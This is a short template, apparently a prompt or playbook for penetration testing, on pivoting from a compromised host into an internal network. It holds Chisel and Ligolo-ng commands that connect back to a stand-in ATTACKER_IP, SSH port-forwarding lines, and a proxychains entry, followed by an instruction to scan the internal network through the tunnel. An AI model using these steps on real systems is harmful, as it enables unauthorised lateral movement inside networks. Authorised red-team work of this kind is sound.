name: Network Pivoting
content:
Configure pivoting from {compromised_ip} to {target_network}.

**Chisel (recommended) :**
```bash
# Server (attacker)
chisel server -p 8080 --reverse

# Client (target)
chisel client ATTACKER_IP:8080 R:socks
```

**Ligolo-ng :**
```bash
# Proxy (attacker)
ligolo-proxy -selfcert

# Agent (target)
ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
```

**SSH tunneling :**
```bash
# Dynamic port forwarding (SOCKS)
ssh -D 9050 user@{compromised_ip}

# Local port forwarding
ssh -L 8080:INTERNAL_IP:80 user@{compromised_ip}
```

**Proxychains configuration :**
```
socks5 127.0.0.1 1080
```

Then scan the internal network through the tunnel.
